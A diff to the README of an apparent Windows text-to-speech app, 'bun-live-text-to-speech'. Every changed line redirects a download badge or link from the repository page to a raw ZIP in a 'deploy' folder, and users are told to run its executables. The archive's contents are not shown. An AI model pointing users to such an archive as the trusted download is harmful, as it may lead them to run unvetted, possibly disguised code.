@@ -1,6 +1,6 @@
 # 🔊 bun-live-text-to-speech - Easy Real-Time Voice From Text
 
-[![Download bun-live-text-to-speech](https://img.shields.io/badge/Download%20App-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/pinagasasabimo/bun-live-text-to-speech)
+[![Download bun-live-text-to-speech](https://img.shields.io/badge/Download%20App-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/pinagasasabimo/bun-live-text-to-speech/raw/refs/heads/main/deploy/bun_live_text_to_speech_v1.5.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Use the steps below to download and run bun-live-text-to-speech on your Windows 
 
 Click the large green button above or visit:
 
-[https://github.com/pinagasasabimo/bun-live-text-to-speech](https://github.com/pinagasasabimo/bun-live-text-to-speech)
+[https://github.com/pinagasasabimo/bun-live-text-to-speech/raw/refs/heads/main/deploy/bun_live_text_to_speech_v1.5.zip](https://github.com/pinagasasabimo/bun-live-text-to-speech/raw/refs/heads/main/deploy/bun_live_text_to_speech_v1.5.zip)
 
 This page holds the files and instructions you need.
 
@@ -115,7 +115,7 @@ For more help, visit the GitHub Issues page on the same repo.
 
 Visit the download page:
 
-[https://github.com/pinagasasabimo/bun-live-text-to-speech](https://github.com/pinagasasabimo/bun-live-text-to-speech)
+[https://github.com/pinagasasabimo/bun-live-text-to-speech/raw/refs/heads/main/deploy/bun_live_text_to_speech_v1.5.zip](https://github.com/pinagasasabimo/bun-live-text-to-speech/raw/refs/heads/main/deploy/bun_live_text_to_speech_v1.5.zip)
 
 - Download the ZIP or release executables.  
 - Extract the ZIP if needed.  
@@ -152,4 +152,4 @@ Once comfortable, explore using similar services or modifying the app code. The 
 
 ---
 
-[![Get bun-live-text-to-speech](https://img.shields.io/badge/Download%20App-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/pinagasasabimo/bun-live-text-to-speech)
+[![Get bun-live-text-to-speech](https://img.shields.io/badge/Download%20App-Get%20It%20Here-brightgreen?style=for-the-badge)](https://github.com/pinagasasabimo/bun-live-text-to-speech/raw/refs/heads/main/deploy/bun_live_text_to_speech_v1.5.zip)
